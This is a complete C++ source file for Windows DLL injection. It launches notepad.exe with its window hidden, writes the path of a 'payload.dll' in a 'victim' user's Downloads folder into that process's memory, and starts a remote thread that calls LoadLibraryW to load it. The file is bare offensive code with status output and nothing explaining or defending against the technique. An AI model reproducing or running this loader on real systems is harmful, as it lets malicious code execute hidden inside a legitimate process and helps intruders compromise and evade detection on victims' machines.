#include <stdio.h>
#include <Windows.h>
#include <iostream>
using namespace std;
int main(int argc, char* argv[]) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    wchar_t dllPath[] = L"C:\\Users\\victim\\Downloads\\payload.dll";
STARTUPINFOW start_info;
PROCESS_INFORMATION process_info;

ZeroMemory(&start_info, sizeof(start_info));
start_info.cb = sizeof(start_info);
ZeroMemory(&process_info, sizeof(process_info));

start_info.dwFlags = STARTF_USESHOWWINDOW;
start_info.wShowWindow = SW_HIDE;

wchar_t process_name[] = L"notepad.exe";

BOOL iscreated = CreateProcessW(
    NULL,
    process_name,
    NULL,
    NULL,
    FALSE,
    0,
    NULL,
    NULL,
    &start_info,
    &process_info
);
if (iscreated)
    {
        cout << "[+] Successfully Create New Process" << "\n";
    }
    else
    {
        cout << "[-] Failed to Create New Process" << "\n";
    }
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_info.dwProcessId);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
    CloseHandle(processHandle);
    return 0;
}